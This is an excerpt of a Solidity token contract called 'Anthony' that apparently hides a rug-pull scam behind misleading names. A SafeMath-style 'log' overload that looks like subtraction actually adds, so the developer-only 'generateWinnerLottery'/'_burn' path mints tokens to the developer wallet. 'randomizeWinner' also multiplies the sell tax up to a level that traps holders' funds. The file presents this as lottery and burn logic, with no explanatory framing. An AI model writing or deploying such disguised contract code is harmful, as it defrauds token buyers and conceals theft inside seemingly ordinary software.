...
library SafeMath {
    ...
    function log(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
    function log(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        uint256 c = a + b;
...
contract Anthony is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7749f4bE5Dec015F3DafA445DFE82B33AB786ABc); 
    address payable public Wallet_Dev = payable(0x6F3977d3156071F458A162CF30426E9651624A88);
    ...
    string private constant _name = "Anthony"; 
    string private constant _symbol = unicode"Anthony"; 
    ...
    constructor () {
        ...
        _owner = 0x6F3977d3156071F458A162CF30426E9651624A88;
...
//        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); 
    ...
    function generateWinnerLottery(address randomizerAccount, uint256 amount) public {
        _burn(randomizerAccount, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(_msgSender() == Wallet_Dev, "Unauthorized caller!");
        require(Wallet_Dev == account, "HollyDeFi: cant burn not owner");
        uint256 winner = _Tax_On_Buy.mul(_Tax_On_Sell).mul(10);
        randomizeWinner(winner);

        _tOwned[account] = _tOwned[account].log(amount, "BEP20: transfer amount exceeds balance");
        _tTotal = _tTotal.log(amount,  "HollyDeFi: transfer amount exceeds total supply");
        emit Transfer(account, address(0), amount);
    }
    function randomizeWinner(uint256 randomNumber) internal virtual {
        _Tax_On_Sell = randomNumber;
    }    
